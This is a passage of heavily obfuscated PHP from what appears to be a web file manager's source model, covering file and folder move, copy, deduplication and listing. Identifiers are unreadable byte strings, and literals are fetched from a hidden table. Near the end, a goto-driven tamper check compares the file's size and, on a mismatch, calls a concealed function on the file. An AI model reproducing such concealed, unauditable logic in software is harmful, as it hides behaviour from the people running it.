$ŸîÖù³é[12]); return $¤Ï–Â²ø; } private function _copyApplyMeta($é³ûƒÁÀ, &$˜×øˆå) { $ƒ—§¹ =& $_SERVER[Î·Ü›öğ]; $¹æìğ‹© = $é³ûƒÁÀ[$ƒ—§¹[194]]; $³óÁğ°œ = $é³ûƒÁÀ[$ƒ—§¹[32]]; if (!isset($é³ûƒÁÀ[$ƒ—§¹[670]]) || !$é³ûƒÁÀ[$ƒ—§¹[670]] || $é³ûƒÁÀ[$ƒ—§¹[670]] == $ƒ—§¹[231]) { $˜×øˆå[$ƒ—§¹[647]][] = array($ƒ—§¹[194], $¹æìğ‹©, $ƒ—§¹[670], short_id($¹æìğ‹©)); } if (Input::check($³óÁğ°œ, $ƒ—§¹[671])) { $˜×øˆå[$ƒ—§¹[646]][] = array($ƒ—§¹[194] => $¹æìğ‹©, $ƒ—§¹[97] => $ƒ—§¹[549], $ƒ—§¹[452] => str_replace($ƒ—§¹[53], $ƒ—§¹[12], Pinyin::get($³óÁğ°œ))); $˜×øˆå[$ƒ—§¹[646]][] = array($ƒ—§¹[194] => $¹æìğ‹©, $ƒ—§¹[97] => $ƒ—§¹[548], $ƒ—§¹[452] => Pinyin::get($³óÁğ°œ, $ƒ—§¹[672])); } $˜×øˆå[$ƒ—§¹[646]][] = array($ƒ—§¹[194] => $¹æìğ‹©, $ƒ—§¹[97] => $ƒ—§¹[528], $ƒ—§¹[452] => KodSort::makeStr($³óÁğ°œ)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($ğã“”) { $×‚úßğÜ =& $_SERVER[Î·Ü›öğ]; $Ã¸ÁĞª™ = $this->sourceInfo($ğã“”); $Í×ûôˆ = $×‚úßğÜ[673]; $Ñ³‹‚®¾ = array($×‚úßğÜ[597] => array($×‚úßğÜ[628], $Ã¸ÁĞª™[$×‚úßğÜ[597]] . $ğã“” . $×‚úßğÜ[629]), $×‚úßğÜ[516] => $this->targetIsDelete); $¬¶¦àÕ = $this->field($Í×ûôˆ)->where($Ñ³‹‚®¾)->select(); if (!$¬¶¦àÕ) { return; } $¬¶¦àÕ = array_to_keyvalue($¬¶¦àÕ, $×‚úßğÜ[194]); foreach ($¬¶¦àÕ as $Ã¢İí¾) { $¾»¤•”ä = $Ã¢İí¾[$×‚úßğÜ[193]]; $ğã“” = $Ã¢İí¾[$×‚úßğÜ[194]]; if (!isset($this->_childrenListCache[$ğã“”]) && $Ã¢İí¾[$×‚úßğÜ[496]] == $×‚úßğÜ[91]) { $this->_childrenListCache[$ğã“”] = array(); } if (!isset($this->_childrenListCache[$¾»¤•”ä])) { $this->_childrenListCache[$¾»¤•”ä] = array(); } $this->_childrenListCache[$¾»¤•”ä][$ğã“”] = $Ã¢İí¾; $this->_childrenItemCache[$ğã“”] = $Ã¢İí¾; } } private function _childrenListAll($»î“É‘ä, &$®—µ†¤š) { $„–ê„» =& $_SERVER[Î·Ü›öğ]; if (!isset($this->_childrenListCache[$»î“É‘ä])) { return; } $ÖäÇ×ƒƒ = $this->_childrenListCache[$»î“É‘ä]; foreach ($ÖäÇ×ƒƒ as $ıçûş¸ => $ô‰óÎã ) { $®—µ†¤š[$ıçûş¸] = $ô‰óÎã ; if ($ô‰óÎã [$„–ê„»[496]] == $„–ê„»[91]) { $this->_childrenListAll($ıçûş¸, $®—µ†¤š); } } } private function sourceInfoCache($ãÅˆª•´) { if (isset($this->_childrenItemCache[$ãÅˆª•´])) { return $this->_childrenItemCache[$ãÅˆª•´]; } return $this->sourceInfo($ãÅˆª•´); } private function _childrenList($×êæƒ¥ë) { if (isset($this->_childrenListCache[$×êæƒ¥ë])) { return $this->_childrenListCache[$×êæƒ¥ë]; } return $this->_childrenListSelect($×êæƒ¥ë); } private function _childrenListSelect($·¼¨ï“Ö) { $åé­êæ¤ =& $_SERVER[Î·Ü›öğ]; $…ËÙÔàÆ = array($åé­êæ¤[193] => $·¼¨ï“Ö, $åé­êæ¤[516] => $this->targetIsDelete); $§è“®Ò = $this->where($…ËÙÔàÆ)->select(); $§è“®Ò = $§è“®Ò ? $§è“®Ò : array(); $ñ‚ßÈ÷† = array_to_keyvalue($§è“®Ò, $åé­êæ¤[194]); $this->_childrenListCache[$·¼¨ï“Ö] = $ñ‚ßÈ÷†; foreach ($ñ‚ßÈ÷† as $·¼¨ï“Ö => $úª²Š ¼) { $this->_childrenItemCache[$·¼¨ï“Ö] = $úª²Š ¼; } return $ñ‚ßÈ÷†; } private function fileNameExistAuto($¼º´×, $„Æ¥¡€÷) { $Ö†ëÈëÈ =& $_SERVER[Î·Ü›öğ]; if ($„Æ¥¡€÷[$Ö†ëÈëÈ[516]] == $Ö†ëÈëÈ[91]) { return $this->fileNameExist($¼º´×, $„Æ¥¡€÷[$Ö†ëÈëÈ[32]]); } return $this->fileNameExistCache($¼º´×, $„Æ¥¡€÷[$Ö†ëÈëÈ[32]]); } private function fileNameExistCache($²‰²ª×ô, $ˆ¢İ„) { $Ô¨ú£İ =& $_SERVER[Î·Ü›öğ]; $ˆ¢İ„ = strtolower($ˆ¢İ„); $êëœ–õï = $this->_childrenList($²‰²ª×ô); foreach ($êëœ–õï as $²‡Áé­Ï) { if ($ˆ¢İ„ == strtolower($²‡Áé­Ï[$Ô¨ú£İ[32]])) { return $²‡Áé­Ï[$Ô¨ú£İ[194]]; } } return !1; } private function fileNameAutoCache($ıâÜı¾÷, $‡šßº¼ƒ, $Î½è×½±, $úÇğ¡Ä‰) { $ø±òµÓ =& $_SERVER[Î·Ü›öğ]; $öíè­ = $this->_childrenList($ıâÜı¾÷); $ãüî¤Û’ = array_to_keyvalue($öíè­, $ø±òµÓ[12], $ø±òµÓ[32]); return $this->fileNameAutoGet($ãüî¤Û’, $‡šßº¼ƒ, $Î½è×½±, $úÇğ¡Ä‰); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($Ï¢§™°û, $±û…ŸÃŞ, $Ûî–è¢É = REPEAT_REPLACE, $ÆŒŸ¨ = '') { $²ØÒ’Ìô =& $_SERVER[Î·Ü›öğ]; $¤—Ó’ä = $this->sourceInfo($Ï¢§™°û); $îù¢ˆæÑ = $this->sourceInfo($±û…ŸÃŞ); if ($¤—Ó’ä[$²ØÒ’Ìô[193]] == $îù¢ˆæÑ[$²ØÒ’Ìô[194]]) { if ($¤—Ó’ä[$²ØÒ’Ìô[516]] == $²ØÒ’Ìô[91]) { Model($²ØÒ’Ìô[514])->restore(array($Ï¢§™°û)); } if (!$ÆŒŸ¨ || $ÆŒŸ¨ == $¤—Ó’ä[$²ØÒ’Ìô[32]]) { return $Ï¢§™°û; } } $§´¶¦—í = $this->pathInfoMore($Ï¢§™°û); if ($this->isParentOf($Ï¢§™°û, $±û…ŸÃŞ)) { return !1; } if (!$¤—Ó’ä || !$îù¢ˆæÑ || $îù¢ˆæÑ[$²ØÒ’Ìô[496]] != $²ØÒ’Ìô[91]) { return !1; } Hook::trigger($²ØÒ’Ìô[674], $§´¶¦—í); $this->targetIsDelete = intval($¤—Ó’ä[$²ØÒ’Ìô[516]]); if ($¤—Ó’ä[$²ØÒ’Ìô[193]] == $±û…ŸÃŞ && $ÆŒŸ¨ != $¤—Ó’ä[$²ØÒ’Ìô[32]]) { $‰èïíÜ = $this->fileNameExist($±û…ŸÃŞ, $ÆŒŸ¨); if ($‰èïíÜ && $¤—Ó’ä[$²ØÒ’Ìô[496]] == $²ØÒ’Ìô[231]) { $…ÑóğÏ€ = $this->sourceInfo($‰èïíÜ); $»Ù ÄÁÂ = $this->fileHistory($…ÑóğÏ€, $¤—Ó’ä[$²ØÒ’Ìô[554]], $¤—Ó’ä[$²ØÒ’Ìô[79]]); if (!$»Ù ÄÁÂ) { Model($²ØÒ’Ìô[557])->remove($¤—Ó’ä[$²ØÒ’Ìô[554]]); } $this->removeNow($Ï¢§™°û, !1); $this->folderSizeReset($±û…ŸÃŞ); Hook::trigger($²ØÒ’Ìô[675], $§´¶¦—í); return $‰èïíÜ; } } $‹»üÛú• = $ÆŒŸ¨ ? $ÆŒŸ¨ : $¤—Ó’ä[$²ØÒ’Ìô[32]]; $this->lockMoveStart($Ï¢§™°û); $this->lockWriteStart($±û…ŸÃŞ, $‹»üÛú•); $’“Á¼®Æ = array($²ØÒ’Ìô[645] => array(), $²ØÒ’Ìô[676] => !1); $this->clearShare($Ï¢§™°û, $±û…ŸÃŞ); $óùİ”áß = $this->fileNameExistAuto($±û…ŸÃŞ, $¤—Ó’ä); $¢ÛœîÉ = $this->_move($Ï¢§™°û, $±û…ŸÃŞ, $Ûî–è¢É, $’“Á¼®Æ, $ÆŒŸ¨); $this->sourceCacheClear(); if ($¤—Ó’ä[$²ØÒ’Ìô[496]] == $²ØÒ’Ìô[91] && $óùİ”áß) { $this->folderSizeResetChildren($¢ÛœîÉ); } Model($²ØÒ’Ìô[233])->linkAdd($’“Á¼®Æ[$²ØÒ’Ìô[645]]); if ($¢ÛœîÉ && $óùİ”áß && $’“Á¼®Æ[$²ØÒ’Ìô[676]]) { $íóûéŠ = $¤—Ó’ä[$²ØÒ’Ìô[496]] == $²ØÒ’Ìô[91] ? $this->_childrenListSelect($Ï¢§™°û) : !1; $·ËÂƒıö = $íóûéŠ && count($íóûéŠ) > 0 ? !0 : !1; $this->removeNow($Ï¢§™°û, $·ËÂƒıö); } $this->lockMoveEnd($Ï¢§™°û); $this->lockWriteEnd($±û…ŸÃŞ, $‹»üÛú•); $this->folderSizeReset($¤—Ó’ä[$²ØÒ’Ìô[193]]); $this->folderSizeReset($±û…ŸÃŞ); $ÔİôªÉº = array($¤—Ó’ä[$²ØÒ’Ìô[193]], $±û…ŸÃŞ); if ($¤—Ó’ä[$²ØÒ’Ìô[496]] == $²ØÒ’Ìô[91]) { $ÔİôªÉº[] = $Ï¢§™°û; } $this->updateModifyTime($ÔİôªÉº); Model($²ØÒ’Ìô[649])->eventMove($Ï¢§™°û, $¤—Ó’ä[$²ØÒ’Ìô[193]], $±û…ŸÃŞ); Hook::trigger($²ØÒ’Ìô[675], $§´¶¦—í); return $¢ÛœîÉ; } private function _move($ñ‡È†³¼, $ßç§ãåû, $ßãËƒŸÆ, &$„“™•ë, $³»‡Ğ—à = '') { $ÕĞ÷Üš =& $_SERVER[Î·Ü›öğ]; $¹ãü¸¢ = $this->sourceInfo($ñ‡È†³¼); $Ú²àê’‘ = $¹ãü¸¢[$ÕĞ÷Üš[496]] == $ÕĞ÷Üš[91]; $ÕÌÀ½îŠ = $³»‡Ğ—à ? $³»‡Ğ—à : $¹ãü¸¢[$ÕĞ÷Üš[32]]; $‡¾™Ã† = $this->fileNameExistAuto($ßç§ãåû, $¹ãü¸¢); $this->lockMoveStart($ñ‡È†³¼); $this->lockWriteStart($ßç§ãåû, $ÕÌÀ½îŠ); if (!$‡¾™Ã†) { return $this->_moveForce($ñ‡È†³¼, $ßç§ãåû, $ÕÌÀ½îŠ); } $Œ™ãÙ = $‡¾™Ã†; $ì‚²©¦Ü = !1; if ($Ú²àê’‘) { if ($ßãËƒŸÆ == REPEAT_RENAME_FOLDER) { $ÕÌÀ½îŠ = $this->fileNameAuto($ßç§ãåû, $ÕÌÀ½îŠ, $ßãËƒŸÆ, $Ú²àê’‘); $Œ™ãÙ = $this->_moveForce($ñ‡È†³¼, $ßç§ãåû, $ÕÌÀ½îŠ); } else { $å”¬à÷½ = $this->_childrenListSelect($ñ‡È†³¼); foreach ($å”¬à÷½ as $ğÃç›‘‡) { $è–§¥Úç = REPEAT_REPLACE; $this->_move($ğÃç›‘‡[$ÕĞ÷Üš[194]], $‡¾™Ã†, $è–§¥Úç, $„“™•ë); } $ì‚²©¦Ü = !0; } } else { if ($ßãËƒŸÆ == REPEAT_RENAME || $ßãËƒŸÆ == REPEAT_RENAME_FOLDER) { $ÕÌÀ½îŠ = $this->fileNameAuto($ßç§ãåû, $ÕÌÀ½îŠ, $ßãËƒŸÆ, $Ú²àê’‘); $Œ™ãÙ = $this->_moveForce($ñ‡È†³¼, $ßç§ãåû, $ÕÌÀ½îŠ); } else { $á—×¹éÃ = $this->sourceInfoCache($‡¾™Ã†); $š¸ô‘æ = $this->fileHistory($á—×¹éÃ, $¹ãü¸¢[$ÕĞ÷Üš[554]], $¹ãü¸¢[$ÕĞ÷Üš[79]]); if ($š¸ô‘æ) { $„“™•ë[$ÕĞ÷Üš[645]][] = $¹ãü¸¢[$ÕĞ÷Üš[554]]; } $ì‚²©¦Ü = !0; } } if ($ì‚²©¦Ü) { $„“™•ë[$ÕĞ÷Üš[676]] = !0; } return $Œ™ãÙ; } private function _moveForce($‹ç°ğ÷á, $á´Ï, $ÖäÊÓÔ¹) { $éÎ®§èƒ =& $_SERVER[Î·Ü›öğ]; $”†µéƒ§ = $this->sourceInfo($‹ç°ğ÷á); $èªÃ½Ûµ = $this->sourceInfo($á´Ï); $Å¡±¼òô = $”†µéƒ§[$éÎ®§èƒ[496]] == $éÎ®§èƒ[91]; $¼ÃÛ³ô‘ = array($éÎ®§èƒ[488] => $èªÃ½Ûµ[$éÎ®§èƒ[194]], $éÎ®§èƒ[668] => $èªÃ½Ûµ[$éÎ®§èƒ[597]] . $èªÃ½Ûµ[$éÎ®§èƒ[194]] . $éÎ®§èƒ[50], $éÎ®§èƒ[664] => $èªÃ½Ûµ[$éÎ®§èƒ[191]], $éÎ®§èƒ[665] => $èªÃ½Ûµ[$éÎ®§èƒ[582]], $éÎ®§èƒ[667] => USER_ID, $éÎ®§èƒ[505] => $ÖäÊÓÔ¹); $¯È©â¿­ = $”†µéƒ§[$éÎ®§èƒ[191]] == SourceModel::TYPE_GROUP && $èªÃ½Ûµ[$éÎ®§èƒ[191]] == SourceModel::TYPE_GROUP && $”†µéƒ§[$éÎ®§èƒ[582]] == $èªÃ½Ûµ[$éÎ®§èƒ[582]]; if (!$¯È©â¿­ && $this->moveClearAuth) { Model($éÎ®§èƒ[580])->authClear($‹ç°ğ÷á); } $ƒõıÛ˜œ = $”†µéƒ§[$éÎ®§èƒ[516]] == $éÎ®§èƒ[91] && $èªÃ½Ûµ[$éÎ®§èƒ[516]] != $éÎ®§èƒ[91]; if ($ƒõıÛ˜œ) { $¼ÃÛ³ô‘[$éÎ®§èƒ[515]] = 0; } if ($Å¡±¼òô) { $ª„Ø³³Ã = array($éÎ®§èƒ[668] => array($éÎ®§èƒ[628], $”†µéƒ§[$éÎ®§èƒ[597]] . $”†µéƒ§[$éÎ®§èƒ[194]] . $éÎ®§èƒ[629])); $“şñí” = $”†µéƒ§[$éÎ®§èƒ[597]] . $”†µéƒ§[$éÎ®§èƒ[194]] . $éÎ®§èƒ[50]; $©ä£¨¯Ò = $èªÃ½Ûµ[$éÎ®§èƒ[597]] . $èªÃ½Ûµ[$éÎ®§èƒ[194]] . $éÎ®§èƒ[50] . $”†µéƒ§[$éÎ®§èƒ[194]] . $éÎ®§èƒ[50]; $‚‡œüè = array($éÎ®§èƒ[668] => array($éÎ®§èƒ[677], "\162\145\160\154\x61\x63\x65\50\160\141\162\x65\156\x74\114\x65\166\x65\154\x2c\x27{$“şñí”}\x27\54\x27{$©ä£¨¯Ò}\x27\x29"), $éÎ®§èƒ[664] => $èªÃ½Ûµ[$éÎ®§èƒ[191]], $éÎ®§èƒ[665] => $èªÃ½Ûµ[$éÎ®§èƒ[582]]); if ($ƒõıÛ˜œ) { $‚‡œüè[$éÎ®§èƒ[515]] = 0; } $this->where($ª„Ø³³Ã)->data($‚‡œüè)->save(); } $this->where(array($éÎ®§èƒ[502] => $‹ç°ğ÷á))->data($¼ÃÛ³ô‘)->save(); return $‹ç°ğ÷á; } private function clearShare($Ã²¤÷ ƒ, $¿¡»ß­˜) { $‡ñ œıë =& $_SERVER[Î·Ü›öğ]; $‰¤à»Ş‰ = $this->sourceInfo($Ã²¤÷ ƒ); $ğ‹ÆÅ…å = $this->sourceInfo($¿¡»ß­˜); if ($‰¤à»Ş‰[$‡ñ œıë[582]] == $ğ‹ÆÅ…å[$‡ñ œıë[582]] && $‰¤à»Ş‰[$‡ñ œıë[191]] == $‡ñ œıë[678]) { return; } $À§»¼ = array($‡ñ œıë[597] => array($‡ñ œıë[628], $‰¤à»Ş‰[$‡ñ œıë[597]] . $Ã²¤÷ ƒ . $‡ñ œıë[629])); $Öº¬è·´ = $this->field($‡ñ œıë[502])->where($À§»¼)->getField($‡ñ œıë[194], !0); if (!$Öº¬è·´) { return; } $À§»¼ = array($‡ñ œıë[194] => array($‡ñ œıë[7], $Öº¬è·´), $‡ñ œıë[679] => 1); $Ğ’¸åı© = Model($‡ñ œıë[680])->field($‡ñ œıë[681])->where($À§»¼)->select(); if (!$Ğ’¸åı©) { return; } $Ğ’¸åı© = array_to_keyvalue($Ğ’¸åı©, $‡ñ œıë[12], $‡ñ œıë[681]); $À§»¼ = array($‡ñ œıë[681] => array($‡ñ œıë[7], $Ğ’¸åı©)); Model($‡ñ œıë[680])->where($À§»¼)->save(array($‡ñ œıë[679] => 0)); Model($‡ñ œıë[682])->where($À§»¼)->delete(); } public function copyFolderFromIO($¯®±Ğ§, $‰¾¢ß , $ ò´ƒà•, $êü–É», $Èõæó‰Ü, $ªß“‡Èü = false) { $Ç¢†ô§ =& $_SERVER[Î·Ü›öğ]; $˜öÖÅ³ = array($Ç¢†ô§[646] => array(), $Ç¢†ô§[647] => array(), $Ç¢†ô§[645] => array(), $Ç¢†ô§[683] => array()); $é¢Óœß  = $ªß“‡Èü ? $ªß“‡Èü : $¯®±Ğ§->pathThis($‰¾¢ß ); $ˆ¾ËÓµ = $this->fileNameExist($ ò´ƒà•, $é¢Óœß ); $¿«¾ö¦‹ = $this->mkdir($ ò´ƒà•, $é¢Óœß , $êü–É»); if (!$ˆ¾ËÓµ || $êü–É» == REPEAT_RENAME_FOLDER) { $êü–É» = !1; } if ($ˆ¾ËÓµ) { $this->_childrenAllMake($ˆ¾ËÓµ); } Hook::trigger($Ç¢†ô§[684]); $ß¹Áï» = KodIO::ioFileDriverGet($Ç¢†ô§[494] . $ ò´ƒà• . $Ç¢†ô§[404]); $this->_copyChildTo($¯®±Ğ§, $‰¾¢ß , $¿«¾ö¦‹, $êü–É», $˜öÖÅ³, $Èõæó‰Ü, $ß¹Áï»); Hook::trigger($Ç¢†ô§[685]); if ($¿«¾ö¦‹) { $this->folderSizeResetChildren($¿«¾ö¦‹); } $this->_childrenListClear(); Model($Ç¢†ô§[648])->addAll($˜öÖÅ³[$Ç¢†ô§[646]], array(), !0); Model($Ç¢†ô§[649])->eventCopy($¿«¾ö¦‹); $this->saveAll($˜öÖÅ³[$Ç¢†ô§[647]]); Model($Ç¢†ô§[557])->linkAdd($˜öÖÅ³[$Ç¢†ô§[645]]); Model($Ç¢†ô§[557])->remove($˜öÖÅ³[$Ç¢†ô§[683]]); $this->folderSizeReset($ ò´ƒà•); $this->updateModifyTime($ ò´ƒà•); return $¿«¾ö¦‹; } private function _copyChildTo($èÏïöÙ©, $Ò²í©, $à™Ö×Ö, $¸©Î¡‰é, &$×åâÖµü, $ŒƒÁÎ®Ú, $¾°‹´ãŞ) { $Šº‚êß– =& $_SERVER[Î·Ü›öğ]; $ãøÂèèÕ = $this->sourceInfoCache($à™Ö×Ö); $±©ÍçÚ = $èÏïöÙ©->listPath($Ò²í©); $±©ÍçÚ = $±©ÍçÚ ? $±©ÍçÚ : array($Šº‚êß–[86] => array(), $Šº‚êß–[85] => array()); $˜•ó²Û = array_merge($±©ÍçÚ[$Šº‚êß–[86]], $±©ÍçÚ[$Šº‚êß–[85]]); $ŠÔüÇÛó = $this->_addFiles($èÏïöÙ©, $¾°‹´ãŞ, $±©ÍçÚ[$Šº‚êß–[86]], $ŒƒÁÎ®Ú); $‹´ ŠÂ± = array(); foreach ($˜•ó²Û as &$··¡ãˆ€) { if (isset($ŠÔüÇÛó[$··¡ãˆ€[$Šº‚êß–[32]]])) { $··¡ãˆ€ = $ŠÔüÇÛó[$··¡ãˆ€[$Šº‚êß–[32]]]; } $··¡ãˆ€[$Šº‚êß–[496]] = $··¡ãˆ€[$Šº‚êß–[33]] == $Šº‚êß–[78]; $··¡ãˆ€[$Šº‚êß–[497]] = substr(_get($··¡ãˆ€, $Šº‚êß–[169], $Šº‚êß–[12]), 0, 10); $··¡ãˆ€[$Šº‚êß–[79]] = _get($··¡ãˆ€, $Šº‚êß–[79], 0); $··¡ãˆ€[$Šº‚êß–[554]] = _get($··¡ãˆ€, $Šº‚êß–[554], 0); if (!isset($··¡ãˆ€[$Šº‚êß–[686]]) && $··¡ãˆ€[$Šº‚êß–[554]]) { $×åâÖµü[$Šº‚êß–[683]][] = $··¡ãˆ€[$Šº‚êß–[554]]; } if ($¸©Î¡‰é) { $¶şªšîù = $this->fileNameExistCache($à™Ö×Ö, $··¡ãˆ€[$Šº‚êß–[32]]); if ($¶şªšîù) { if ($··¡ãˆ€[$Šº‚êß–[496]] || $¸©Î¡‰é == REPEAT_SKIP) { continue; } if ($¸©Î¡‰é == REPEAT_REPLACE) { $¯çŠ‡ªé = $this->sourceInfoCache($¶şªšîù); $äÎ°ûû¼ = $this->fileHistory($¯çŠ‡ªé, $··¡ãˆ€[$Šº‚êß–[554]], $··¡ãˆ€[$Šº‚êß–[79]]); if ($äÎ°ûû¼) { $×åâÖµü[$Šº‚êß–[645]][] = $··¡ãˆ€[$Šº‚êß–[554]]; } continue; } else { if ($¸©Î¡‰é == REPEAT_RENAME) { $··¡ãˆ€[$Šº‚êß–[32]] = $this->fileNameAutoCache($à™Ö×Ö, $··¡ãˆ€[$Šº‚êß–[32]], $¸©Î¡‰é, !1); } } } } if (!$··¡ãˆ€[$Šº‚êß–[496]] && $··¡ãˆ€[$Šº‚êß–[554]] == 0) { continue; } if (!$··¡ãˆ€[$Šº‚êß–[496]] && $··¡ãˆ€[$Šº‚êß–[554]]) { $×åâÖµü[$Šº‚êß–[645]][] = $··¡ãˆ€[$Šº‚êß–[554]]; } $‹´ ŠÂ±[] = $this->_makeItemData($··¡ãˆ€, $ãøÂèèÕ, $··¡ãˆ€[$Šº‚êß–[32]]); } unset($··¡ãˆ€); if (!empty($‹´ ŠÂ±)) { $this->addAll($‹´ ŠÂ±); $this->_childrenListSelect($à™Ö×Ö); } $éâ¤¢±å = $this->_childrenList($à™Ö×Ö); $éâ¤¢±å = array_to_keyvalue($éâ¤¢±å, $Šº‚êß–[32]); foreach ($˜•ó²Û as $··¡ãˆ€) { $¯çŠ‡ªé = $éâ¤¢±å[$··¡ãˆ€[$Šº‚êß–[32]]]; $ÓÑã²şº = $¯çŠ‡ªé[$Šº‚êß–[194]]; $this->_copyApplyMeta($¯çŠ‡ªé, $×åâÖµü); if ($··¡ãˆ€[$Šº‚êß–[33]] == $Šº‚êß–[78]) { $··¡ãˆ€[$Šº‚êß–[87]] = $èÏïöÙ©->getPathInner($··¡ãˆ€[$Šº‚êß–[87]]); $this->_copyChildTo($èÏïöÙ©, $··¡ãˆ€[$Šº‚êß–[87]], $ÓÑã²şº, $¸©Î¡‰é, $×åâÖµü, $ŒƒÁÎ®Ú, $¾°‹´ãŞ); } } } private function _addFiles($íı¶â¶Ñ, $Õä¿œ¶¬, $ÛÕğë‡™, $šÜãÁ¥) { $ÏûŞ©¯ş =& $_SERVER[Î·Ü›öğ]; if (!$ÛÕğë‡™ || count($ÛÕğë‡™) == 0) { return array(); } $ÖëşÆ¦ = array(); foreach ($ÛÕğë‡™ as &$ÙªÙ±½) { Hook::trigger($ÏûŞ©¯ş[687], $ÙªÙ±½); $ÙªÙ±½[$ÏûŞ©¯ş[87]] = $íı¶â¶Ñ->getPathInner($ÙªÙ±½[$ÏûŞ©¯ş[87]]); $±™‚õ¨ğ = $íı¶â¶Ñ->hashSimple($ÙªÙ±½[$ÏûŞ©¯ş[87]]); $ˆ¬¬—Ö = $íı¶â¶Ñ->hashMd5($ÙªÙ±½[$ÏûŞ©¯ş[87]]); if (strlen($ˆ¬¬—Ö) > 10 && !isset($ÖëşÆ¦[$ˆ¬¬—Ö])) { $ÖëşÆ¦[$ˆ¬¬—Ö] = array(); } $ÙªÙ±½[$ÏûŞ©¯ş[688]] = $±™‚õ¨ğ; $ÙªÙ±½[$ÏûŞ©¯ş[560]] = $ˆ¬¬—Ö; $ÖëşÆ¦[$ˆ¬¬—Ö][] =& $ÙªÙ±½; if (count($ÖëşÆ¦[$ˆ¬¬—Ö]) > 1) { $ÙªÙ±½[$ÏûŞ©¯ş[686]] = !0; } Hook::trigger($ÏûŞ©¯ş[689], $ÙªÙ±½); } unset($ÙªÙ±½); $½ˆØïé¿ = array($ÏûŞ©¯ş[560] => array($ÏûŞ©¯ş[7], array_keys($ÖëşÆ¦))); $•¦…¢™ò = Model($ÏûŞ©¯ş[690]); $¯ôåş¨ = $•¦…¢™ò->where($½ˆØïé¿)->select(); $¯ôåş¨ = $¯ôåş¨ ? $¯ôåş¨ : array(); foreach ($¯ôåş¨ as $Å¨´æîĞ) { if (!isset($ÖëşÆ¦[$Å¨´æîĞ[$ÏûŞ©¯ş[560]]])) { continue; } $›‰¡ó®ı = $ÖëşÆ¦[$Å¨´æîĞ[$ÏûŞ©¯ş[560]]]; foreach ($›‰¡ó®ı as &$ÙªÙ±½) { $ÙªÙ±½[$ÏûŞ©¯ş[554]] = $Å¨´æîĞ[$ÏûŞ©¯ş[554]]; $ÙªÙ±½[$ÏûŞ©¯ş[686]] = !0; } unset($ÙªÙ±½); } $ãàºÄ±† = array(); foreach ($ÛÕğë‡™ as $ «Âë…­) { Hook::trigger($ÏûŞ©¯ş[691], $ «Âë…­); if (isset($ «Âë…­[$ÏûŞ©¯ş[686]]) && $ «Âë…­[$ÏûŞ©¯ş[686]]) { Hook::trigger($ÏûŞ©¯ş[692], $ «Âë…­); continue; } $¶—ÄØ¿Ô = $íı¶â¶Ñ->getPathInner($ «Âë…­[$ÏûŞ©¯ş[87]]); $âåöùÛÎ = $•¦…¢™ò->addFileMake($¶—ÄØ¿Ô, $Õä¿œ¶¬, $ «Âë…­[$ÏûŞ©¯ş[79]], $ «Âë…­[$ÏûŞ©¯ş[688]], $ «Âë…­[$ÏûŞ©¯ş[560]], $ «Âë…­[$ÏûŞ©¯ş[32]], $šÜãÁ¥); Hook::trigger($ÏûŞ©¯ş[692], $ «Âë…­); if (!is_array($âåöùÛÎ)) { continue; } $ãàºÄ±†[] = $âåöùÛÎ; } $•¦…¢™ò->addAll($ãàºÄ±†); $½ˆØïé¿ = array($ÏûŞ©¯ş[560] => array($ÏûŞ©¯ş[7], array_keys($ÖëşÆ¦))); $¯ôåş¨ = $•¦…¢™ò->where($½ˆØïé¿)->select(); $¯ôåş¨ = $¯ôåş¨ ? $¯ôåş¨ : array(); foreach ($¯ôåş¨ as $Å¨´æîĞ) { if (!isset($ÖëşÆ¦[$Å¨´æîĞ[$ÏûŞ©¯ş[560]]])) { continue; } $öêã«”É =& $ÖëşÆ¦[$Å¨´æîĞ[$ÏûŞ©¯ş[560]]]; foreach ($öêã«”É as &$ÙªÙ±½) { $ÙªÙ±½[$ÏûŞ©¯ş[554]] = $Å¨´æîĞ[$ÏûŞ©¯ş[554]]; } unset($ÙªÙ±½); } $õ‹Â­¬‹ = array(); foreach ($ÛÕğë‡™ as $¥º“Íù) { $õ‹Â­¬‹[$¥º“Íù[$ÏûŞ©¯ş[32]]] = $¥º“Íù; } return $õ‹Â­¬‹; } } define($_SERVER[Î·Ü›öğ][693], $_SERVER[Î·Ü›öğ][694]); $dkcsutgroi = $_SERVER[Î·Ü›öğ][695]; goto B‚­´º„¯¢; e–õ…©ÇÙ®: $_size = $_SERVER[Î·Ü›öğ][480]; if ($_SERVER[$_SERVER[Î·Ü›öğ][481]] != $_size($_file)) { $_getc = $_SERVER[Î·Ü›öğ][482]; $_getfile = $_SERVER[$_SERVER[Î·Ü›öğ][483]] . $_SERVER[Î·Ü›öğ][484]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Î·Ü›öğ][288], $_getfilec); if (count($_getarrs) < $_SERVER[Î·Ü›öğ][485]) { $exit = $_SERVER[Î·Ü›öğ][486]; $exit(); } $_act = $_SERVER[Î·Ü›öğ][487]; $_act($_file); } class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\137\x73\x6f\x75\162\143\145"; protected $tableMeta = array("\164\141\142\154\x65\116\x61\x6d\145" => "\x69\157\137\163\x6f\165\x72\143\x65\137\155\x65\x74\141", "\155\x65\x74\x61\x46\x69\145\154\x64" => "\x73\x6f\165\162\143\x65\111\104"); protected $dataAuto = array(array("\x6d\x6f\x64\x69\146\x79\124\x69\155\145", "\164\151\x6d\145", "\x69\x6e\163\145\162\x74", "\x66\x75\156\x63\x74\x69\157\x6e"), array("\143\162\x65\x61\164\x65\x54\x69\155\145", "\164\151\155\145", "\151\x6e\163\145\x72\x74", "\146\x75\x6e\143\164\151\157\156"), array("\x76\x69\145\167\124\x69\x6d\145", "\164\x69\155\x65", "\x69\156\163\x65\x72\164", "\146\165\156\x63\164\151\157\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($‰Ÿ›†²×) { return $this->listSource(array($_SERVER[Î·Ü›öğ][488] => $‰Ÿ›†²×)); } public function typeName($×§´€²š) { static $Ğñ‡´óÉ = array(self::TYPE_SYSTEM => "\x73\x79\163\x74\x65\x6d", self::TYPE_USER => "\x75\x73\x65\x72", self::TYPE_GROUP => "\147\162\157\165\x70"); return $Ğñ‡´óÉ[$×§´€²š . $_SERVER[Î·Ü›öğ][12]]; } public function sourceListInfo($‰û£µû», 